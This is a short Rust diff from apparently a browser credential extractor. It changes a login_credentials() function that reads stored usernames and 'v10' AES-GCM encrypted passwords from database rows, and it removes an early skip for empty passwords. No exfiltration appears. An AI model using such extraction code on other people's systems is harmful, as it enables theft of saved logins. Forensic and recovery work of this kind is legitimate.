@@ -111,10 +111,6 @@ pub fn login_credentials() -> ExtractorResult<Vec<Credential>> {
             let username_value = row.get::<_, String>(1)?;
             let password_value = row.get::<_, Vec<u8>>(2)?;
 
-            if password_value.len() <= 0 {
-                continue;
-            }
-
             let decrypted_password = {
                 if password_value.len() > 0 {
                     // Prefix "v10" is used for AES-GCM encrypted passwords w/ length of 3
